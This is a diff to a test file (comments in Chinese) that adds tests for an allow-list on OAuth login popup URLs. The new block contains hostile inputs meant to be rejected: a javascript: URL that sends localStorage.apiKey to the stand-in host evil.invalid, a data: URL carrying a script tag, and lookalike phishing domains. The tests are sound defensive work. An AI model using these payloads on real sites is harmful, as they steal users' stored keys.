@@ -29,6 +29,7 @@ import {
 } from '../lib/workshop-client';
 import {
   decodeJwtPayload,
+  isAllowedLoginUrl,
   setWorkshopSocialEnv,
   useWorkshopSocialStore,
   WORKSHOP_AUTH_STORAGE_KEY,
@@ -385,7 +386,7 @@ describe('login', () => {
     vi.useFakeTimers();
     let ready = false;
     routes = [
-      [LOGIN_URL, () => json({ url: 'https://d/', state: STATE })],
+      [LOGIN_URL, () => json({ url: 'https://discord.com/oauth2/authorize', state: STATE })],
       [
         POLL_PREFIX,
         () =>
@@ -412,7 +413,7 @@ describe('login', () => {
   it('★ 轮询报 success:false（多为 Discord 服务器门槛）→ 终局失败，message 原样给 UI', async () => {
     vi.useFakeTimers();
     routes = [
-      [LOGIN_URL, () => json({ url: 'https://d/', state: STATE })],
+      [LOGIN_URL, () => json({ url: 'https://discord.com/oauth2/authorize', state: STATE })],
       [POLL_PREFIX, () => json({ ready: true, success: false, message: '你不在允许的服务器中' })],
     ];
 
@@ -432,7 +433,7 @@ describe('login', () => {
     vi.useFakeTimers();
     let offline = true;
     routes = [
-      [LOGIN_URL, () => json({ url: 'https://d/', state: STATE })],
+      [LOGIN_URL, () => json({ url: 'https://discord.com/oauth2/authorize', state: STATE })],
       [
         POLL_PREFIX,
         () => {
@@ -509,6 +510,49 @@ describe('login', () => {
 // ═══════════════════════════════════════════════════════════
 // 登出（O4）
 // ═══════════════════════════════════════════════════════════
+
+describe('登录地址白名单（开弹窗前的那一刀）', () => {
+  it('★ 非 https 一律拒 —— javascript: 弹窗会在与本源关联的上下文里执行', () => {
+    expect(isAllowedLoginUrl('javascript:fetch("//evil.invalid?k="+localStorage.apiKey)')).toBe(
+      false,
+    );
+    expect(isAllowedLoginUrl('data:text/html,<script>alert(1)</script>')).toBe(false);
+    expect(isAllowedLoginUrl('http://discord.com/oauth2/authorize')).toBe(false);
+  });
+
+  it('★ 陌生域一律拒 —— 弹窗保留 opener，放进来就能 opener.location = 钓鱼页', () => {
+    expect(isAllowedLoginUrl('https://evil.invalid/oauth2/authorize')).toBe(false);
+    // 后缀像但不是：`notdiscord.com` 不能因为「以 discord.com 结尾」被放行
+    expect(isAllowedLoginUrl('https://notdiscord.com/oauth2/authorize')).toBe(false);
+    // 域名藏在别的位置也不算
+    expect(isAllowedLoginUrl('https://evil.invalid/?x=discord.com')).toBe(false);
+    expect(isAllowedLoginUrl('https://evil.invalid#discord.com')).toBe(false);
+  });
+
+  it('放行 Discord 授权页与工坊 worker（含子域）', () => {
+    expect(isAllowedLoginUrl('https://discord.com/oauth2/authorize?client_id=1')).toBe(true);
+    expect(isAllowedLoginUrl('https://canary.discord.com/oauth2/authorize')).toBe(true);
+    expect(isAllowedLoginUrl(`${WORKSHOP_API_BASE}/api/auth/redirect`)).toBe(true);
+  });
+
+  it('畸形串 / 相对地址不许抛，直接拒', () => {
+    expect(isAllowedLoginUrl('')).toBe(false);
+    expect(isAllowedLoginUrl('/api/auth/login')).toBe(false);
+    expect(isAllowedLoginUrl('discord.com/oauth2')).toBe(false);
+  });
+
+  it('★ 起飞端点给了个坏地址 → 一个弹窗都不许开', async () => {
+    routes = routes.filter(([prefix]) => prefix !== LOGIN_URL);
+    routes.push([LOGIN_URL, () => json({ url: 'https://evil.invalid/steal', state: STATE })]);
+    const store = useWorkshopSocialStore();
+    store.init();
+
+    const out = await store.login();
+    expect(out.status).toBe('failed');
+    expect(popups).toHaveLength(0); // 关键断言：没开
+    expect(store.isLoggedIn).toBe(false);
+  });
+});
 
 describe('logout', () => {
   it('★ 一发请求都不出去（上游 logout 是纯 no-op），本地清干净', async () => {
